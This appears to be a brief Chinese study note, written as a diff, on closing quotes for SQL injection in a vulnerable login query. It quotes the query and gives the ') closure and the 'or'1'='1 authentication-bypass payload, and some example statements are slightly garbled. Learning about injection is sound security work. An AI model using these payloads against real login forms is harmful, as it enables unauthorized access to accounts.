@@ -1,0 +1,24 @@
+首先去查看查询语句：
+"SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1";
+
+如果要闭合得：
+admin') 注入语句 =('
+
+得到一个想法：字符注入如果能看到查询语句，如果查询语句为select xxx from users where xxx=('xxx') and xxx=('xxx') 那么注释的时候要算上等于号
+select username,password from users where username='admin' and password='admin';
+闭合：
+' ='
+然后万能密码是：
+'or'1'='1
+带入句子变成：
+select username,password from where username='admin'or'1'='1' and password ='admin';
+
+所以以后闭合的时候见到后方有等于号的记得把等号算入闭合之中
+
+总结：
+字符型闭合如果后面有等号
+例子：select username,password from users where username='admin' and password='admin';
+
+语句='admin;
+等于号到下一个字段中间都算入闭合语句这里就是：
+' ='
